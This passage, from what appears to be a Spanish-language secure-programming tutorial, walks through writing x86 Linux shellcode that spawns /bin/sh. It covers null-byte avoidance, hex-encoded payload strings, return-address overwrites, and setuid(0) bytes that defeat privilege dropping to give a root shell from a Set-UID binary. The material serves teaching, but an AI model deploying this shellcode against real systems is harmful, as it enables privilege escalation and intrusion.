al sistema, as&iacute; que la distinci&oacute;n se hace con el contenido
del registro <tt>%eax</tt>. Respecto a <tt>execve()</tt>, tiene el valor
<tt>0x0B</tt>,
mientras que <tt>_exit()</tt> tiene el
<tt>0x01</tt>.
<br>&nbsp;
<center><table WIDTH="90%" summary="text and images" >
<tr>
<td><img SRC="execve.png" ALT="parameters of the execve() function" ></td>
</tr>

<caption align="BOTTOM"><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a NAME="execve" href="#execve"></a><a href="#execve" name="execve">Diag.
4</a> : par&aacute;metros de la funci&oacute;n <tt>execve()</tt></caption>
</table></center>

<p>El an&aacute;lisis de las instrucciones de estas funciones en Ensamblador
nos proporcionan los par&aacute;metros que usan :
<ul>
<li>
<tt>execve()</tt> necesita varios par&aacute;metros (cf. diag <a href="#execve">4</a>)
:</li>

<ul>
<li>
el registro <tt>%ebx</tt> contiene la direcci&oacute;n de la cadena que
representa el comando a ejecutar, en nuestro ejemplo "<tt>/bin/sh</tt>"
(<tt>0x804d9b1 : mov 0x8(%ebp),%edi</tt> seguido por
<tt>0x804d9c9 : mov
%edi,%ebx</tt>) ;</li>

<li>
el registro <tt>%ecx</tt> contiene la direcci&oacute;n del arreglo argumento
(<tt>0x804d9c2 : mov 0xc(%ebp),%ecx</tt>). El primer argumento debe ser
el nombre del programa y no necesitamos m&aacute;s : un arreglo que contiene
la direcci&oacute;n de la cadena "<tt>/bin/sh</tt>" y un apuntador NULL
ser&aacute; suficiente;</li>

<li>
el registro <tt>%edx</tt> contiene la direcci&oacute;n del arreglo que
representa el programa que inicia el ambiente (<tt>0x804d9c5 : mov 0x10(%ebp),%edx</tt>).
Para mantener nuestro programa simple usaremos un ambiente vac&iacute;o
: basta con un apuntador a NULL.</li>
</ul>

<li>
la funci&oacute;n <tt>_exit()</tt> termina el proceso, y regresa un c&oacute;digo
de ejecuci&oacute;n a su padre (generalmente un shell), contenido en el
registro
<tt>%ebx</tt> ;</li>
</ul>
Ahora necesitamos la cadena "<tt>/bin/sh</tt>", un apuntador a esta cadena
y un apuntador NULL (para los argumentos dado que no tenemos alguno&nbsp;
y para el ambiente dado que tampoco definimos alguno). Podemos ver una
posible representaci&oacute;n de datos antes de la llamada a <tt>execve()</tt>.
Al construir un arreglo con un apuntador a la cadena <tt>/bin/sh</tt> seguida
por un apuntador NULL , el registro <tt>%ebx</tt> apuntar&aacute; a la
cadena, el registro <tt>%ecx</tt> al arreglo completo, y el registro <tt>%edx</tt>
al segundo elemento del arreglo (NULL). Esto se muestra en diag. <a href="#data">5</a>.
<br>&nbsp;
<center><table WIDTH="90%" summary="one image" >
<tr>
<td><img SRC="art_02_01.gif" ALT="data" height=120 width=300></td>
</tr>

<caption align="BOTTOM"><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a NAME="data" href="#data"></a><a href="#data" name="data">Diag.
5</a> : representaci&oacute;n de los datos relativos a los registros</caption>
</table></center>

<A NAME="183lfindex16">&nbsp;</A>
<H2>
Localizando el c&oacute;digo shell dentro de la memoria</H2>

El c&oacute;digo shell generalmente se inserta dentro de un programa vulnerable
atrav&eacute;s de un argumento de l&iacute;nea de comando, una variable
de ambiente o una cadena tecleada. De cualquier manera, cuande se crea
el c&oacute;digo shell no se conoce la direcci&oacute;n que usar&aacute;.
Sin embargo, debemos conocer la direcci&oacute;n de la cadena "<tt>/bin/sh</tt>".
Un peque&ntilde;o truco nos permite obtenerla.
<p>Cuando se llama a una subrutina con la instrucci&oacute;n <tt>call</tt>,
el CPU almacena la direcci&oacute;n de regreso en la pila, que es la direcci&oacute;n
que sigue inmediatamente a esta insrucci&oacute;n <tt>call</tt> (ver arriba).
Generalmente el paso siguiente es almacenar el estado de la pila (especialemente
el registro
<tt>%ebp</tt> con la instrucci&oacute;n
<tt>push %ebp</tt>).
Para obtener la direcci&oacute;n de regreso al arrancar a subrutina, basta
con sacar el elemento de la cima de la pila mediante la instrucci&oacute;n
<tt>pop</tt>.
Por supuesto, entonces se almacena la cadena "<tt>/bin/sh</tt>" inmediatamente
despu&eacute;s de la instrucci&oacute;n
<tt>call</tt> para permitir que
el "pr&oacute;logo hecho en casa" proporcione la requerida direcci&oacute;n
de la cadena. Es decir :
<pre>&nbsp;beginning_of_shellcode:
&nbsp;&nbsp;&nbsp; jmp subroutine_call
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;subroutine:
&nbsp;&nbsp;&nbsp; popl %esi
&nbsp;&nbsp;&nbsp; ...
&nbsp;&nbsp;&nbsp; (Shellcode itself)
&nbsp;&nbsp;&nbsp; ...&nbsp;
&nbsp;subroutine_call:
&nbsp;&nbsp;&nbsp; call subroutine
&nbsp;&nbsp;&nbsp; /bin/sh</pre>
Por supuesto, la subrutina no es real: la llamada a
<tt>execve()</tt> tiene
&eacute;xito, y el proceso es sustituido por un shell, o falla y la funci&oacute;n
<tt>_exit()</tt> termina el programa. El registro <tt>%esi</tt> proporciona
la direcci&oacute;n de la cadena "<tt>/bin/sh</tt>". Entonces, es suficiente
para construir el arreglo poni&eacute;ndolo exactamente despu&eacute;s
de la cadena : su primer elemento (en <tt>%esi+8</tt>, la longitud de <tt>/bin/sh</tt>
+ un byte null) contiene el valor del registro <tt>%esi</tt>, y su segundo
elemento en <tt>%esi+12</tt> una direcci&oacute;n null (32 bit). El c&oacute;digo
se ver&aacute; as&iacute; :
<pre>&nbsp;&nbsp;&nbsp; popl %esi
&nbsp;&nbsp;&nbsp; movl %esi, 0x8(%esi)
&nbsp;&nbsp;&nbsp; movl $0x00, 0xc(%esi)</pre>
El diagrama <a href="#tab">6</a> muestra el &aacute;rea de datos :
<br>&nbsp;
<center><table WIDTH="90%" summary="one image" >
<tr>
<td><img SRC="art_02_02.gif" ALT="data area" height=64 width=273></td>
</tr>

<caption align="BOTTOM"><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a NAME="tab" href="#tab"></a><a href="#tab" name="tab">Diag.
6</a> : arreglo de datos</caption>
</table></center>

<A NAME="183lfindex17">&nbsp;</A>
<H2>
El probema de los bytes null</H2>

Con frecuencia las funciones vulnerables con rutinas de manipulaci&oacute;n
de cadenas como
<tt>strcpy()</tt>. Para insertar el c&oacute;digo en medio
de una aplicaci&oacute;n destino, el c&oacute;digo shell tiene que copiarse
como una cadena. Sin embargo estas rutinas de copiado se detienen tan pronto
como encuentran un caracter null. Por lo que nuestro c&oacute;digo no debe
contenerlos. Con algunos trucos estaremos prevenidos de escribir bytes
null. Por ejemplo, la instrucci&oacute;n
<pre>&nbsp;&nbsp;&nbsp; movl $0x00, 0x0c(%esi)</pre>
ser&aacute; sustituida con
<pre>&nbsp;&nbsp;&nbsp; xorl %eax, %eax
&nbsp;&nbsp;&nbsp; movl %eax, %0x0c(%esi)</pre>
Este ejemplo muestra el uso de un byte null. Sin embargo las traducci&oacute;n
de algunas instrucciones a hexadecimal pueden revelar bytes null. Por ejemplo,
para hacer la distinci&oacute;n entre la llamada a sistema <tt>_exit(0)</tt>
y otras, el valor del registro
<tt>%eax</tt> es 1, como se ve en
<p><tt>0x804d996 &lt;_exit+6>: mov $0x1,%eax</tt>
<p>Convertida a decimal, esta cadena se convierte en :
<pre>&nbsp;b8 01 00 00 00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x1,%eax</pre>
Debe evitarse su uso. De hecho, el truco es inicializar el registro
<tt>%eax</tt>
con un valor de 0 e incrementarlo.
<p>Por otro lado, la cadena "<tt>/bin/sh</tt>" debe terminar con un byte
null. Puede escribirse al crear el c&oacute;digo shell, pero, dependiendo
del mecanismo usado para insertarlo en un programa, este byte null puede
no estar presente en el final de la aplicaci&oacute;n. Es mejor agregar
uno de esta manera :
<pre>&nbsp;&nbsp;&nbsp; /* movb solamente trabaja sobre un byte */
&nbsp;&nbsp;&nbsp; /* esta instrucci&oacute;n es equivalente a */
&nbsp;&nbsp;&nbsp; /* movb %al, 0x07(%esi) */
&nbsp;&nbsp;&nbsp; movb %eax, 0x07(%esi)</pre>

<A NAME="183lfindex18">&nbsp;</A>
<H2>
Construyendo el c&oacute;digo shell</H2>

Ahora ya tenemos todo para crear nuestro c&oacute;digo shell :
<pre>/* shellcode4.c */

int main()
{
&nbsp; asm("jmp subroutine_call

subrutina:
&nbsp;&nbsp;&nbsp; /* obtenemos la direcci&oacute;n de /bin/sh*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl %esi
&nbsp;&nbsp;&nbsp; /* la escribimos como primer elemento del arreglo */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl %esi,0x8(%esi)
&nbsp;&nbsp;&nbsp; /* escribimos NULL como segundo elemento del arreglo */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl %eax,%eax
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl %eax,0xc(%esi)
&nbsp;&nbsp;&nbsp; /* colocamos el byte null al final de la cadena */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb %eax,0x7(%esi)
&nbsp;&nbsp;&nbsp; /* funci&oacute;n execve() */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb $0xb,%al
&nbsp;&nbsp;&nbsp; /* colocamos en %ebx la cadena que ser&aacute; ejecutada*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl %esi, %ebx
&nbsp;&nbsp;&nbsp; /* colocamos en %ecx el arreglo de argumentos*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal 0x8(%esi),%ecx
&nbsp;&nbsp;&nbsp; /* colocamos en %edx el ambiente del arreglo*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal 0xc(%esi),%edx
&nbsp;&nbsp;&nbsp; /* System-call */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp; $0x80

&nbsp;&nbsp;&nbsp; /* Null return code */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl %ebx,%ebx
&nbsp;&nbsp;&nbsp; /*&nbsp; _exit() function : %eax = 1 */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl %ebx,%eax
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp; %eax
&nbsp;&nbsp;&nbsp; /* System-call */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp; $0x80

subroutine_call:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; subroutine_call
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .string \"/bin/sh\"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ");
}</pre>
El c&oacute;digo se compila con "<tt>gcc -o shellcode4 shellcode4.c</tt>".
La orden "<tt>objdump --disassemble shellcode4</tt>" asegura que nuestro
binario no contiene mas bytes null :
<pre>08048398 &lt;main>:
&nbsp;8048398:&nbsp;&nbsp; 55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebp
&nbsp;8048399:&nbsp;&nbsp; 89 e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esp,%ebp
&nbsp;804839b:&nbsp;&nbsp; eb 1f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 80483bc&nbsp;
&lt;subroutine_call>

0804839d &lt;subroutine>:
&nbsp;804839d:&nbsp;&nbsp; 5e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi
&nbsp;804839e:&nbsp;&nbsp; 89 76 08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,0x8(%esi)
&nbsp;80483a1:&nbsp;&nbsp; 31 c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %eax,%eax
&nbsp;80483a3:&nbsp;&nbsp; 89 46 0c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; %eax,0xc(%esi)
&nbsp;80483a6:&nbsp;&nbsp; 88 46 07&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; %al,0x7(%esi)
&nbsp;80483a9:&nbsp;&nbsp; b0 0b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0xb,%al
&nbsp;80483ab:&nbsp;&nbsp; 89 f3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx
&nbsp;80483ad:&nbsp;&nbsp; 8d 4e 08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0x8(%esi),%ecx
&nbsp;80483b0:&nbsp;&nbsp; 8d 56 0c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xc(%esi),%edx
&nbsp;80483b3:&nbsp;&nbsp; cd 80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80
&nbsp;80483b5:&nbsp;&nbsp; 31 db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %ebx,%ebx
&nbsp;80483b7:&nbsp;&nbsp; 89 d8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebx,%eax
&nbsp;80483b9:&nbsp;&nbsp; 40&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; incl&nbsp;&nbsp; %eax
&nbsp;80483ba:&nbsp;&nbsp; cd 80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80

080483bc &lt;subroutine_call>:
&nbsp;80483bc:&nbsp;&nbsp; e8 dc ff ff ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 804839d &lt;subroutine>
&nbsp;80483c1:&nbsp;&nbsp; 2f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; das&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;80483c2:&nbsp;&nbsp; 62 69 6e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; boundl 0x6e(%ecx),%ebp
&nbsp;80483c5:&nbsp;&nbsp; 2f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; das&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;80483c6:&nbsp;&nbsp; 73 68&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jae&nbsp;&nbsp;&nbsp; 8048430&nbsp;
&lt;_IO_stdin_used+0x14>
&nbsp;80483c8:&nbsp;&nbsp; 00 c9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addb&nbsp;&nbsp; %cl,%cl
&nbsp;80483ca:&nbsp;&nbsp; c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;80483cb:&nbsp;&nbsp; 90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nop&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;80483cc:&nbsp;&nbsp; 90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nop&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;80483cd:&nbsp;&nbsp; 90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nop&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;80483ce:&nbsp;&nbsp; 90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nop&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;80483cf:&nbsp;&nbsp; 90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nop</pre>
Los datos encontrados despu&eacute;s de la direcci&oacute;n 80483c1 no
representan instrucciones, sino los caracteres de la cadena "<tt>/bin/sh</tt>"&nbsp;
(en&nbsp; hexad&eacute;cimal, la secuencia <tt>2f 62 69 6e 2f 73 68 00</tt>)
y bytes aleatorios. El c&oacute;digo no contiene ceros, excepto el caracter
null al final de la cadena en 80483c8.
<p>Ahora, probemos nuestro programa :
<pre>$ ./shellcode4
Segmentation fault (core dumped)
$</pre>
Ooops! No muy concluyente. Si lo pensamos un poco, podemos ver que el &aacute;rea
de memoria donde se encuentra la funci&oacute;n <tt>main()</tt>&nbsp; (i.e.
el &aacute;rea
<tt>text</tt> mencionada al comienzo de este art&iacute;culo)
es read-only. El c&oacute;digo shell no puede modificarlo &iquest;Qu&eacute;
podemos hacer ahora para probar nuestro c&oacute;digo shell?
<p>Para salvar el problema read-only, debe colocarse el c&oacute;digo shell
en un &aacute;rea de datos. Pong&aacute;moslo en un arreglo declarado como
una variable global. Debemos usar otro truco para poder ejecutar el c&oacute;digo
shell. Sustituyamos la direcci&oacute;n de regreso de la funci&oacute;n&nbsp;
<tt>main()</tt> que se encuentra en la pila con la direcci&oacute;n del
arreglo que contiene el c&oacute;digo shell. No olvidemos que la funci&oacute;n
<tt>main</tt>
es una rutina "standard", llamada por pedazos de c&oacute;digo que el ligador
agrega. La direcci&oacute;n de retorno se sobreescribe al escribir el arreglo
de caracteres dos lugares mas abajo de la primera posici&oacute;n de la
pila.
<pre>&nbsp; /* shellcode5.c */
&nbsp;&nbsp;
&nbsp; char shellcode[] =
&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";

&nbsp; int main()
&nbsp; {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int * ret;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* +2 se comportar&aacute; como un offset de 2 words */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* (i.e. 8 bytes) en la cima de la pila : */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*&nbsp;&nbsp; - el primero para la palabra reservada para&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; la variable local */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*&nbsp;&nbsp; - el segundo para el registro guardado %ebp */

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * ((int *) &amp; ret + 2) = (int) shellcode;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return (0);
&nbsp; }</pre>
Ahora podemos probar nuestro c&oacute;digo shell :
<pre>$ cc shellcode5.c -o shellcode5
$ ./shellcode5
bash$ exit
$</pre>
Incluso podemos instalar el programa&nbsp; <tt>shellcode5</tt> Set-UID
<i>root</i>,
y checar que el shell arrancado con la <i>data</i> manejada por este programa,
se ejecuta bajo la identidad de <i>root</i>&nbsp; :
<pre>$ su
Password:
# chown root.root shellcode5
# chmod +s shellcode5
# exit
$ ./shellcode5
bash# whoami
root
bash# exit
$</pre>

<A NAME="183lfindex19">&nbsp;</A>
<H2>
Generalizaci&oacute;n y &uacute;ltimos detalles</H2>

Este c&oacute;digo shell esta algo limitado (bueno, &iexcl;No es tan malo
para tan pocos bytes!). Por ejemplo, si nuestro programa de prueba se convierte
en :
<pre>&nbsp; /* shellcode5bis.c */
&nbsp;&nbsp;
&nbsp;char shellcode[] =
&nbsp;"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
&nbsp;"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
&nbsp;"\x80\xe8\xdc\xff\xff\xff/bin/sh";

&nbsp; int main()
&nbsp; {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int * ret;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; seteuid(getuid());
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * ((int *) &amp; ret + 2) = (int) shellcode;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return (0);
&nbsp; }</pre>
arreglamos el proceso efectivo de UID a su valor real UID, como lo sugerimos
en el art&iacute;culo anterior. Esta vez, el shell se corre sin privilegios
espec&iacute;ficos :
<pre>$ su
Password:
# chown root.root shellcode5bis
# chmod +s shellcode5bis
# exit
$ ./shellcode5bis
bash# whoami
pappy
bash# exit
$</pre>
Sin embargo, las instrucciones <tt>seteuid(getuid())</tt> no son una protecci&oacute;n
muy efectiva. Solamente se necesita insertar la llamada equivaente&nbsp;
<tt>setuid(0);</tt> al inicio del c&oacute;digo shell para obtener los
derechos ligados a una EUID inicial para una aplicaci&oacute;n S-UID.
<p>Este c&oacute;digo de instrucci&oacute;n es :
<pre>&nbsp; char setuid[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x31\xc0"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* xorl %eax, %eax */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x31\xdb"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* xorl %ebx, %ebx */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xb0\x17"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* movb $0x17, %al */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xcd\x80";

</pre>
Integr&aacute;ndolo al c&oacute;digo shell anterior, el ejemplo se convierte
en :
<pre>&nbsp; /* shellcode6.c */
&nbsp;&nbsp;
&nbsp; char shellcode[] =
&nbsp; "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" /* setuid(0) */
&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";

&nbsp; int main()
&nbsp; {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int * ret;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; seteuid(getuid());
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * ((int *) &amp; ret + 2) = (int) shellcode;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return (0);
&nbsp; }</pre>
Veamos c&oacute;mo trabaja :
<pre>$ su
Password:
# chown root.root shellcode6
# chmod +s shellcode6
# exit
$ ./shellcode6
bash# whoami
root
bash# exit
$</pre>
Como se muestra en este ejemplo, es posible agregar funciones a un c&oacute;digo
shell, por ejemplo para dejar el directorio impuesto por la funci&oacute;n

<tt>chroot()</tt> o para abrir un shell remoto usando un socket.
<p>Tales cambios parecen implicar que se puede adaptar el valor de algunos
bytes en el c&oacute;digo shell de acuerdo con su uso :
<br>&nbsp;
<table WIDTH="100%" summary="shellcode adapted" >
<tr>
<td><tt>eb XX</tt></td>

<td><tt>&lt;subroutine_call></tt></td>

<td>XX = n&uacute;mero de bytes para alcanzar &lt;subroutine_call></td>
</tr>

<tr>
